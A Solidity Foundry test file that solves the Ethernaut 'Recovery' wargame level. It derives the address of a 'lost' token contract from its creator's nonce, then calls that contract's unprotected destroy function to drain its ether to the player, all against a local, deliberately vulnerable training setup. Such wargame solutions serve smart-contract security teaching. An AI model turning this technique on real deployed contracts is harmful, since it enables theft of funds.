// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { SimpleToken } from "src/Recovery/Recovery.sol";

import { PRBTest } from "@prb/test/PRBTest.sol";
import { console } from "forge-std/console.sol";

import { Ethernaut } from "src/Ethernaut.sol";
import { SimpleToken } from "src/Recovery/Recovery.sol";
import { RecoveryFactory } from "src/Recovery/RecoveryFactory.sol";

import { addressFrom } from "src/utils/addressFrom.sol";

contract RecoveryAttack is PRBTest {
    Ethernaut public ethernaut;
    RecoveryFactory public factory;
    address public recoveryInstance;
    address public playerAddress = address(0x696969);

    function setUp() public {
        vm.startPrank(playerAddress);
        vm.deal(playerAddress, 69 ether);
        ethernaut = new Ethernaut();
        factory = new RecoveryFactory();

        ethernaut.registerLevel(factory);
        recoveryInstance = ethernaut.createLevelInstance{ value: 0.69 ether }(factory);
        vm.stopPrank();
    }

    function testRecoveryAttack() public {
        uint256 instanceNonce = vm.getNonce(recoveryInstance);
        address lostTokenAddress = addressFrom(recoveryInstance, instanceNonce - 1);

        console.log("instance nonce", instanceNonce);
        console.log("lost token address", lostTokenAddress);

        uint256 beforeBalance = lostTokenAddress.balance;
        // destroy the "lost" contract and send the ether elsewhere
        SimpleToken(payable(lostTokenAddress)).destroy(payable(playerAddress));
        uint256 afterBalance = lostTokenAddress.balance;
        assert(beforeBalance > afterBalance);

        vm.startPrank(playerAddress, playerAddress);
        // submit level as player
        bool levelComplete = ethernaut.submitLevelInstance(payable(recoveryInstance));
        assert(levelComplete);
        vm.stopPrank();
    }
}
